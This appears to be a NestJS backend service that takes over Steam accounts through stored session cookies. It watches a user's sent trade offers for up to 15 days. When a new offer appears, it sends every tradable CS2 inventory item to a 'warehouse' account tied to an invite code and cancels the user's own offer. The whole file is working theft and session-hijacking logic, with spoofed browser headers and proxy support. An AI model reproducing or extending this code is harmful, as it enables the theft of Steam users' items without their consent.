import { COOKIE_PERSISTENCE_SERVICE, CookiePersistenceService } from '@backend/cookies';
import { NotFound } from "@backend/nestjs";
import { Inject, Injectable, Logger } from "@nestjs/common";
import { ConfigService } from "@nestjs/config";
import { AxiosInstance } from 'axios';
import { ClsService } from "nestjs-cls";
import { CookieJar } from 'tough-cookie';
import { HttpClientService } from '../http/http-client.service';
import { RetryHttpService } from '../http/retry-http.service';
import { ProxiesService } from "../proxies/proxies.service";
import { ScarpingService } from "../scarping/scarping.service";
import { CustomPromiseTimeout } from "../shared";
import { WarehouseService } from "../warehouse/warehouse.service";
import { InventoryItem, InventoryItemForTrade } from "./dto";

@Injectable()
export class TradeService {
    private readonly logger: Logger = new Logger(TradeService.name);

    constructor(
        private readonly warehouseService: WarehouseService, 
        private readonly scarpingService: ScarpingService,
        @Inject(COOKIE_PERSISTENCE_SERVICE)
        private readonly cookiePersistence: CookiePersistenceService,
        private readonly proxyService: ProxiesService,
        private readonly configService: ConfigService,
        private readonly clsService: ClsService,
        private readonly retryHttpService: RetryHttpService,
        private readonly httpClientService: HttpClientService
    ) {}
    
    private generateHeaders(tradeUserId: string, headerCookies: string) {
        const headers = {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Referer': `https://steamcommunity.com/tradeoffer/new/?partner=${tradeUserId}`,
            'Origin': 'https://steamcommunity.com',
            cookie: headerCookies,
            'Accept': '*/*',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8,ru;q=0.7',
            'Accept-encoding': 'gzip, deflate, br, zstd',
            'Cache-control': 'no-cache',
            'Connection': 'keep-alive',
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
            'sec-ch-ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin'
        };

        return headers
    }

    private generatePayload(sessionIdCookie: string, steamId: string, data: any) {
        const payload = new URLSearchParams();
        payload.append('sessionid', sessionIdCookie);
        payload.append('serverid', '1');
        payload.append('partner', steamId);
        payload.append('tradeoffermessage', "");
        payload.append('json_tradeoffer', JSON.stringify(data));
        payload.append('captcha', '');
        payload.append('trade_offer_create_params', '{}');
        return payload
    }

    private getUsername() {
        return this.clsService.get("username")
    }

    private getInviteCode() {
        return this.clsService.get("invite-code")
    }


    private async cancelTrade(idToCancel: string, httpClient: AxiosInstance, cookieJar: CookieJar, userId: string) {
        const username = this.getUsername()
        const cancelTradeUrl = `https://steamcommunity.com/tradeoffer/${idToCancel}/cancel`;
        const cookies = await cookieJar.getCookies(cancelTradeUrl)
        const sessionIdCookie = cookies.find(c => c.key === 'sessionid');
        if(!sessionIdCookie) {
        this.logger.error(`[Steam Service] Ошибка: Не найдены куки в экземпляре axios на странице ${cancelTradeUrl}`);
        throw new Error ("Cookies not found in axios instance");
        }
        const actionName = `CancelTrade_${idToCancel}`;
        const headerCookies = cookies.map(c => `${c.key}=${c.value}`).join("; ")
        const headers = {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Referer': `https://steamcommunity.com/profiles/${userId}/tradeoffers/sent/`,
            'Origin': 'https://steamcommunity.com',
            cookie: headerCookies,
            'Accept': '*/*',
            'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8,ru;q=0.7',
            'Accept-encoding': 'gzip, deflate, br, zstd',
            'Cache-control': 'no-cache',
            'Connection': 'keep-alive',
            'sec-ch-ua-mobile': '?0',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin'
        };
        const payload = new URLSearchParams();
        payload.append('sessionid', sessionIdCookie.value);

    
        const response = await this.retryHttpService.executeApiActionWithRetry(
        httpClient,
        {
            url: cancelTradeUrl,
            method: 'POST',
            data: payload,
            headers
        },
        username,
        "cancelTrade"
        );    if (response && response.status >= 400) {
        this.logger.error(`[${actionName}] Failed to get HTML, received status ${response.status} for URL: ${cancelTradeUrl}`);
        throw new Error("Failed to cancel trade offer");
        }
        this.logger.log(`Response in cacelling trade: ${response}`)
    }

    private async monitorTradesWithCheerio(httpClient: AxiosInstance, cookieJar: CookieJar) {
        const username = this.getUsername()
        const inviteCode = this.getInviteCode()
        const sentOffersUrl = 'https://steamcommunity.com/my/tradeoffers/sent';
        this.logger.log(`[${username}] Starting trade monitoring...`);

        const WAIT_TIME = 8000
        let tries = 1296000 / (WAIT_TIME / 1000);
        
        const startResult = await this.scarpingService.getHtmlWithRetry(username, sentOffersUrl, `GetSentOffers_${username}`, httpClient);
        if(!startResult) {
            this.logger.warn(`[${username}] Could not fetch sent offers page at the start.`);
            throw new Error(`[${username}] Could not fetch sent offers page at the start.`)
        }
        let html = this.scarpingService.loadHtml(startResult.data)
        let startCount = (this.scarpingService.getHtmlElement(html, '.tradeoffer')).length;
        while (tries > 0) {
            const result = await this.scarpingService.getHtmlWithRetry(username, sentOffersUrl, `GetSentOffers_${username}`, httpClient);
            if (!result) {
                this.logger.warn(`[${username}] Could not fetch sent offers page, skipping check.`);
                await CustomPromiseTimeout(1000 * 5);
                tries--;
                continue;
            }
            try {
            html = this.scarpingService.loadHtml(result.data)
            const tradeOfferElements = this.scarpingService.getHtmlElement(html, '.tradeoffer');
            const currentCount = tradeOfferElements.length;
            if(currentCount > startCount) {
                const tradeOfferElements = this.scarpingService.getHtmlElement(html, '.tradeoffer');
                const tradeOfferIds = tradeOfferElements.map((_, el) => {
                    html(el).attr('id')
                    const tradeOfferId = this.scarpingService.getHtmlAttribute(html, el, 'id')
                    return tradeOfferId?.split("_")[1];
                })
                    this.logger.log(`[${username}] Detected change in sent trades (${startCount} -> ${currentCount}). Assuming trade accepted. Initiating sending items...`);
                    await this.sendTradeTest(httpClient, cookieJar, result.userId)
                    await this.cancelTrade(tradeOfferIds[0], httpClient, cookieJar, result.userId)
                    startCount += 2
                    this.logger.log(`[${username}] Item sending process finished for this trigger.`);
            }

            } catch (parseError) {
                this.logger.error(`[${username}] Error parsing sent offers HTML: ${parseError}`);
            }

            tries--;
            await CustomPromiseTimeout(WAIT_TIME);
        }
        this.logger.log(`[${username}] Monitoring finished after ${tries} checks.`);
    }


    private async getInventory(httpClient: AxiosInstance, userId: string) {
        const inventoryUrl = `https://steamcommunity.com/inventory/${userId}/730/2`;
        const params = {
        l: 'english',
        count: 5000,
        };
    
        console.log(`[Steam Service] Запрос инвентаря: ${inventoryUrl}`);
    
        try {
        const response = await httpClient.get(inventoryUrl, { params });
    
        if (response.data && response.data.assets && response.data.descriptions) {
            this.logger.debug(`[Steam Service] Инвентарь получен. Найдено ${response.data.total_inventory_count} предметов.`);
            const tradableItems = response.data.descriptions
            .filter(item => item.tradable)
            .map(item => ({
            appid: item.appid,
            classid: item.classid,
            }));

            this.logger.debug(`Tradable items: ${JSON.stringify(tradableItems)}`)

            const tradableSet = new Set(tradableItems.map(item => `${item.classid}`));
        
            const items: InventoryItemForTrade[] = response.data.assets
            .filter((asset: InventoryItem) => {
                const key = `${asset.classid}`;
                return tradableSet.has(key);
            })
            .map((asset: InventoryItem) => ({
                appid: asset.appid.toString(),
                contextid: asset.contextid,
                amount: parseInt(asset.amount),
                assetid: asset.assetid,
            }));
            this.logger.debug(`Inventory items: ${JSON.stringify(tradableItems)}`)
            return items;
        } else {
            this.logger.error('[Steam Service] Ошибка: Некорректный формат ответа инвентаря.', response.data);
            return null;
        }
        } catch (error) {
        console.error(`[Steam Service] Ошибка при запросе инвентаря: ${error.response?.status || error.message}`);
        if (error.response?.status === 401 || error.response?.status === 403) {
            this.logger.error('[Steam Service] Ошибка авторизации при получении инвентаря. Возможно, сессия истекла.');
            throw new Error(error)
        }
        return null;
        }
    }
    

    private async sendTradeTest(httpClient: AxiosInstance, cookieJar: CookieJar, userId: string, ){
        const username = this.getUsername()
        const inviteCode = this.getInviteCode()
        this.logger.debug("Started initiating sending trade")
        this.logger.log(`HTTP CLIENT IN SEND TRADE TEST: ${httpClient}`)
        const tradePartnerUrl = "https://steamcommunity.com/tradeoffer/new/send"
        const cookies = await cookieJar.getCookies(tradePartnerUrl);
        const sessionIdCookie = cookies.find(c => c.key === 'sessionid');
        if(!sessionIdCookie) {
        this.logger.error(`[Steam Service] Ошибка: Не найдены куки в экземпляре axios для пользователя ${username}`);
        throw new NotFound("Cookies not found in axios instance");
        }
        const inventory = await this.getInventory(httpClient, userId);
        if(!inventory) {
            this.logger.error(`Inventory not found or empty for user: ${username}`)
            throw new NotFound("Inventory not found")
        }
        this.logger.debug(`Found inventory with ${inventory?.length} length`)
        const formattedAssets = inventory.map(item => ({
            appid: item.appid,
            contextid: item.contextid,
            amount: item.amount,
            assetid: item.assetid.toString()
        }));
        const tradeOfferData = {
            newversion: true,
            version: 2,
            me: {
                assets: formattedAssets,
                currency: [],
                ready: false,
            },
            them: {
                assets: [],
                currency: [],
                ready: false,
            },
        };

        
        const warehouseAccount = await this.warehouseService.getWarehouseAccountByStatusAndRefferal(true, inviteCode);
        if(!warehouseAccount) {
            this.logger.error(`[Steam Service] Ошибка: Не найдена активная учетная запись склада для пользователя ${username}`);
            throw new NotFound("No active warehouse account found")
        }
        const payload = this.generatePayload(sessionIdCookie.value, warehouseAccount.steamId, tradeOfferData);

        this.logger.log(`Payload for trade request: ${payload}`)
        this.logger.log(`Cookies for trade request: ${cookies}`)
        const headerCookies = cookies.map(c => `${c.key}=${c.value}`).join("; ")
    
        const headers = this.generateHeaders(warehouseAccount.tradeUserId, headerCookies);

        try {

        const response = await this.retryHttpService.executeApiActionWithRetry(
            httpClient,
            {
                url: tradePartnerUrl,
                method: 'POST',
                data: payload.toString(),
                headers
            },
            username,
            "sendTrade"
        );
        if (response && response.data && response.data.tradeofferid) {
            this.logger.log(`[Steam Service] Обмен успешно создан! ID: ${response.data.tradeofferid}`);
            this.logger.debug(JSON.stringify(response.data))
        } else {
            this.logger.debug('[Steam Service] Обмен создан, но ID не найден в ответе или есть другие сообщения:', response);
            throw new Error('[Steam Service] Обмен создан, но ID не найден в ответе')
        }
        this.logger.debug(`Successful trade: ${response}`)
        } catch (error) {
            this.logger.error(error)
        throw new Error(`[Steam Service] Ошибка при отправке обмена: ${error.response?.status} ${error.response.message}`);
        }
    }

    async monitorTradesLifecycle(): Promise<void> {
        const username = this.getUsername()

        const { httpClient, jar } = await this.httpClientService.createHttpClient(username)

        // TODO: Сделать через AWS S3
        await this.cookiePersistence.load(username, jar);
        
        this.logger.log(`[${username}] Session created. Starting the monitoring process.`);

        this.monitorTradesWithCheerio(httpClient, jar);
        
        await this.cookiePersistence.save(username, jar)
    }
}